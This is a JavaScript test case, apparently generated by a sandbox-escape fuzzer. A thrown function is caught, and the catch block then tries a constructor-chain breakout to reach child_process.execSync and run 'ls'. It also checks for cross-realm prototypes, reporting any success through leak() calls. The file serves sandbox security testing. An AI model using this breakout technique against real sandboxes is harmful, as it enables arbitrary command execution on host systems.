try {
    function fn(a) {
        let REPLACER = 23;
        let b = 1;
        var c = 1;
        const d = 1;
        (function (a, b, c, d) {
            throw () => {
                return () => {
                };
            };
            a = 2;
            b = 2;
            c = 2;
            d = 2;
            assert.sameValue(a, 2);
            assert.sameValue(b, 2);
            assert.sameValue(c, 2);
            assert.sameValue(d, 2);
        }(1, 1));
        assert.sameValue(a, 1);
        assert.sameValue(b, 1);
        assert.sameValue(c, 1);
        assert.sameValue(d, 1);
    }
    fn(1);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}